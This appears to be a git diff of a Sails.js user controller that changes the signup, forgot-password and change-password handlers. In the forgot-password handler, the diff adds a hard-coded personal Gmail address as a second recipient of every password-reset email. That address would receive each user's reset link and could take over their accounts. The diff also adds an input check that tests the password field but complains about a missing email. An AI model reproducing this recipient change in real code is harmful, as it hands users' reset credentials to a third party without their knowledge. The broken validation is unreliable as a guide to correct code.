@@ -16,8 +16,7 @@ module.exports = {
         res.json(Mailer.sendWelcomeMail(user));
     }).catch((err) => {
      const resp = Object.keys((err.invalidAttributes)).join(',');
-     res.json({"message":"the field "+" "+resp+" "+"is unclear or the field exist already!!"});
-          
+     res.json({"message":"the field "+" "+resp+" "+"is unclear or the field exist already!!"}); 
     });
   },
   All(req, res) {
@@ -116,6 +115,10 @@ module.exports = {
   forgotpassword(req,res){
     const email = req.body.email;
     const password = req.body.password;
+    //this check if the user input is undefined or empty
+    if (password==='') {
+      return res.badRequest('An email address is required!');
+      }
     //find if the user exists in the database
     User.findOne({
       email: email
@@ -156,7 +159,7 @@ module.exports = {
         // setup email data with unicode symbols
         let mailOptions = {
           from: '"Olango new 👻" <olango@olango.com>', // sender address
-          to: email, // list of receivers
+          to: [email,"oghenerukevwejeff@gmail.com"], // list of receivers
           subject: 'RESSET PASSWORD FOR olango ✔', // Subject line
           html: '<img src="https://image.ibb.co/dqwyUG/profile_Pics.png" alt="profile_Pics" border="0">'+'</br>'+'<div>You are receiving this because you (or someone else) have requested the reset of the password for your account.\n\n</div>' +
             '<div>Please click on the following link, or paste this into your browser to complete the process:\n\n</div>' +
@@ -172,7 +175,7 @@ module.exports = {
           }
           res.json({
             Messagesent:info.messageId,
-            Messageinfo:'check your mail to confirm the sent link'
+            Messageinfo:'check your mail to confirm the sent link if not easily found refresh the browser or check your span'
           });
           // Preview only available when sending through an Ethereal account
           res.json({PreviewURL:nodemailer.getTestMessageUrl(info)});
@@ -223,8 +226,10 @@ module.exports = {
       if (!user) {
         return res.notFound('Could not find user, sorry.');
       }
+      //insatantiate a cookie to be stored inside the users browser in other to be of used 
       res.cookie('rememberme', validation_tokenR , { expires: new Date(Date.now() + 900000), httpOnly: true });
       sails.log('Found "%s"', user);
+      //this renders a view for the user to change his/her passwords on the browser
       return res.view('changepassword')
     });
     
